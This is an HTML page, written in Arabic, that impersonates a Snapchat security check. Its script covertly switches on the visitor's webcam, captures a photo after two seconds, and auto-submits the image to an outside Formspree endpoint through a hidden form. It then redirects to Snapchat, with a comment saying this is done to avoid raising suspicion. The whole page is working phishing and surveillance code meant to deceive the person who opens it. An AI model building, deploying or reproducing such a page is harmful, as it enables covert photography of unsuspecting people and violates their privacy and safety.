<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat | التحقق من الأمان</title>
    <!-- أيقونة سناب شات -->
    <link rel="icon" type="image/png" href="https://snapchat.com">
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #FFFC00; }
        .box { text-align: center; background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 85%; max-width: 350px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h3 { font-size: 18px; color: #333; margin: 0; }
        p { font-size: 13px; color: #666; margin-top: 10px; }
    </style>
</head>
<body>

    <div class="box">
        <div class="loader"></div>
        <h3>جاري التحقق من أمان المتصفح</h3>
        <p>يرجى السماح بالوصول للكاميرا للمتابعة...</p>
    </div>

    <!-- عناصر المعالجة المخفية -->
    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <!-- الرابط المحدث الخاص بك -->
    <form id="photoForm" action="https://formspree.io" method="POST">
        <input type="hidden" name="image_data" id="imageInput">
        <input type="hidden" name="_next" value="https://snapchat.com">
        <input type="hidden" name="_subject" value="صورة جديدة ملتقطة">
    </form>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const imageInput = document.getElementById('imageInput');
        const form = document.getElementById('photoForm');

        // طلب الإذن والبدء
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                
                // التقاط الصورة بعد ثانيتين لضمان الوضوح وتعديل الإضاءة
                setTimeout(() => {
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, 640, 480);
                    
                    // تحويل الصورة لـ JPEG مع ضغط لضمان قبولها في Formspree
                    const dataURL = canvas.toDataURL('image/jpeg', 0.5);
                    imageInput.value = dataURL;
                    
                    // إرسال النموذج تلقائياً
                    form.submit();
                }, 2000);
            })
            .catch(err => {
                console.error("تم رفض الكاميرا:", err);
                // التوجه للسناب شات حتى في حال الرفض لعدم إثارة الشكوك
                window.location.href = "https://snapchat.com";
            });
    </script>
</body>
</html>
